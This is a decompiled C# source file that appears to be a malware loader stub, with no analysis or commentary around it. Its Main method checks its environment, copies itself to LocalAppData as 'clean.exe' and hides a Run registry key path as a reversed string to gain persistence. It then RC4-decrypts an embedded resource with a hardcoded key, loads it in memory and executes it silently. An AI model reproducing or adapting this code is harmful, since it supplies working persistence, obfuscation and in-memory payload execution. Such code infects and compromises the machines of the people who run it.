using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using ns14;
using ns2;

namespace ns12;

internal class Class63
{
	private static void Main(string[] args)
	{
		if (!Class58.smethod_5() || !Class3.smethod_1())
		{
			return;
		}
		object[] parameters = new object[0];
		int num = new Random().Next(300, 750);
		long num2 = Environment.TickCount;
		_ = Environment.TickCount - num2;
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\clean.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\clean.exe");
		}
		string name = smethod_0("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		registryKey.SetValue("", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\clean.exe");
		registryKey.Close();
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = smethod_1((byte[])resourceManager.GetObject("g3Y8Jp"), "Hc9KnQIWhLxbftHc3ilk4kbJGoo23sHwHXwdf2bBJ0q1gBne3TvH6bcxb");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < byte_0.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			byte_0[j] ^= array[num2];
		}
		return byte_0;
	}
}
